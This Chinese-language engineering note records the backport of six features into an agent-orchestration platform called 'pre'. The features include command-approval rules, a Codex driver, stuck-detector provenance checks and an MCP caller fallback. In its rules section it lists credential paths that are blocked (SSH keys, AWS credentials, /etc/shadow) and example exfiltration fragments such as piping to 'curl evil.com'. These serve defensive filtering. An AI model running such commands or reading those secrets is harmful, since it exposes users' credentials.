# fn_pre 最新 features backport 到 pre

**Date**: 2026-05-11
**Status**: done

## 背景

pre 是 fn_pre 的 cleanup 版本 (经过 rename + 多 token RBAC 重构), 但 fn_pre 仍在持续
迭代. 用户准备用 pre 替换其他机器上的 fn_pre, 但本仓落后 6 个 fn_pre commit
(b822851..9987173), 缺最近一周的 fix + 新 features. 需要一次性 backport 同步.

## 范围

从 fn_pre origin/main 6 commits 整合, 仅平台代码:

| fn_pre commit | feature | pre 整合方式 |
|---|---|---|
| f4eef68 (260507.0) | governor judgment rules | rules.py 加 `_has_sensitive_override` |
| fbf1cbf (260508.0) | env file 纯读 allow | 跟上面合并, 直接用 v3 终版 |
| b822851 (260510.1) | MCP caller_id top-level fallback | pre_mcp/tools.py 加第 3 路径 |
| 525999c (260510.0) | stuck_detector inject provenance | tmux_helper + start_node |
| d93dddd (260506.0) | cli-codex-local driver + evaluator 抽取 | 新 driver 模块 + 改 hook.py 薄壳 |
| 13bc3e3 (260506.1) | usage stale filter | server.py `/api/v1/usage` 默认过滤 |

**没整合** (有意跳过):
- `src/master/usage_prober.py` + `scripts/usage_probe_once.py` — fn_pre 自己注释掉
  master 内嵌 prober loop. 走 cron 触发的轻量路径, 改在 sys-subsystem-integration
  PR 单独整合
- `pre/agent_config.json` 改动 — fn_pre dogfood 用, 不算平台代码
- CLAUDE.md +45 行 — pre 已有更精简的版本

## 改动清单

### rules.py 安全分层 (260507.0 + 260508.0)

prefix-allow 是性能层 (0ms), 不是 LLM judgment 层. 命中 `cat/head/tail/grep` 等
read prefix 但同时含敏感路径或副作用 → fall through 到 governor.

v3 规则:
- **真泄露即坏** (`~/.ssh/`, 私钥, AWS 凭证, `/etc/shadow`, gh token) — 永远
  fall-through
- **看场景** (`.env`) — 纯读 (`cat .env`, `source .env.fork`) 走 prefix-allow, 配
  exfil (`| curl evil.com`, `> /etc/passwd`) 才 fall-through

效果: `.env` 合法用法不再误 ASK, 真带 exfil 还是拦.

### prehook_evaluator 抽取 (260506.0)

`src/hook.py` 173 行 → 78 行薄壳. 决策逻辑全搬到 `src/prehook_evaluator.py`. Claude
hook 走 `from .prehook_evaluator` package import; codex driver 通过 sys.path 加
`src/` 后 top-level `import prehook_evaluator` (fail-closed: 失败返 ask).

### cli-codex-local driver 新模块

`src/drivers/cli_codex_local/` 含 `driver.py + pending_parser.py + __init__.py`,
agent_id 形如 `<node_id>.cli-codex-local.<project>`. detect_pending 内嵌 evaluator:
allow → 自动按 1, deny → Escape, ask → 上报 master pending. audit log chmod 600
按天.

### cli_claude_code_local driver 兜底扫

加 cursor root 兜底扫 — 项目有 `pre/agent_config.json` 但 `pre_rule/agents/` 没建
(e.g. claude code 没装 hook 触发 ensure_agent_dir) 也能被发现. 同时修 claude
code v2 渲染末尾留白让 ask UI / busy 检测漏判的问题.

### stuck_detector inject provenance (260510.0)

`tmux_helper.py` 加 `_outstanding_injects` + `threading.Lock` + 4 公共 API
(`get_outstanding_inject` / `clear_outstanding_inject`). `send_to_tmux` 注入后登
记, 提交后清, retry 失败保留. `scripts/start_node.py::stuck_detector_loop` 加严
格全等校验: pending_text == inject_text[:200] 才 auto-Enter.

**防的场景**: Claude Code v2 偶发 ghost-text 预填 prompt 到输入框, stuck_detector
90s 后误 Enter 提交, agent 调 MCP 推 chat 出去, bus 单方面捏造 user 指令.

### MCP caller_id 顶层 fallback (260510.1)

`pre_mcp/tools.py::_caller_from_agent_config` 加第 3 路径: 顶层 `agent_id` (要求
`node_id.` 前缀) 也接受. 跟 multi-token RBAC 正交 — master 端 `_validate_caller`
仍按 node_id 前缀校验, 没动 auth 体系.

配 `scripts/backfill_mcp_caller_id.py` (dry-run + apply) 给老 config 一键补
explicit `mcp.caller_agent_id`.

### usage endpoint stale filter (260506.1 server.py 部分)

`/api/v1/usage` GET 默认仅返 `stale=false` (age ≤ 1800s), `?include_stale=true`
显式覆盖. 防 T-Deck 等消费方展示 8h 前的 used_pct=null 坏 snapshot. 配
`scripts/cleanup_stale_usage_snapshots.py` 手动清 DB.

## rename 规则 (机械式应用)

| fn_pre | pre |
|---|---|
| `fn_pre` (项目名 + 仓库名) | `pre` |
| `fn_pre_mcp/` | `pre_mcp/` |
| `fn_pre_rule` | `pre_rule` |
| `fn_pre_fe` | `pre_ui` |
| `fn_pre_log` | `pre_log` |
| `~/.fn_pre/` | `~/.pre/` |
| `FN_PRE_*` env vars (FN_PRE_NODE_ID / FN_PRE_SECRET 等) | `PRE_*` |
| 绝对 home 路径 hardcode (fn_pre 原作者机器残留) | `$HOME` / `os.path.expanduser("~")` |
| `fn_ceo` / `fn_msg` / `fn_fe` 角色仓库 | `agent-ceo` / `agent-msg` / `agent-fe` |

不动: tmux session 名 (`sys_claude` / `sys_gemini` / `sys_codex` 是协议层标识),
driver type 名 (`cli-claude-code-local` / `cli-codex-local`).

## 跟现有 features 不冲突

pre 此前已有 `260510 multi-token-rbac` + `260511 token-multi-source-isolation`
(master 端 4-role token + `~/.pre/env` 单点出入口). 本次 backport 涉及的
`pre_mcp/tools.py` caller_id fallback 跟这两个 feature **正交**:

- caller_id fallback 改的是 mcp 客户端**推断** caller_agent_id 的逻辑
- master 端 `_validate_caller` + token 角色验证 + scope 检查完全没动
- `~/.pre/env` 单点出入口没改

其他 5 个 features 跟 token 体系完全无关.

## 验证

- `src/rules.py` v3 sensitive override: 8/8 case
- `scripts/test_stuck_detector_provenance.py`: 9/9 case
- `scripts/test_cli_codex_local_driver.py`: parser 10/10 + activity helpers 3/3
- `scripts/backfill_mcp_caller_id.py --dry-run`: 5 configs detected, 3 待 patch
- `pre_mcp/tools.py` `_caller_from_agent_config`: 5 path 测试覆盖 (explicit /
  driver_type+project_name / top_aid / non-prefixed reject / empty)
- 全部 py_compile + package import OK

## 已知 issue

- codex driver 的 `from prehook_evaluator import` 在 driver context 走 sys.path
  top-level import, 跟 prehook_evaluator.py 内部 `from .config` relative import 冲突,
  实际触发 fail-closed → ask. fn_pre 同样问题, 设计是 codex driver lazy import
  + try/except, 不崩. 真要修需要重构 evaluator 让两种 import 路径都 work, 后续 PR.
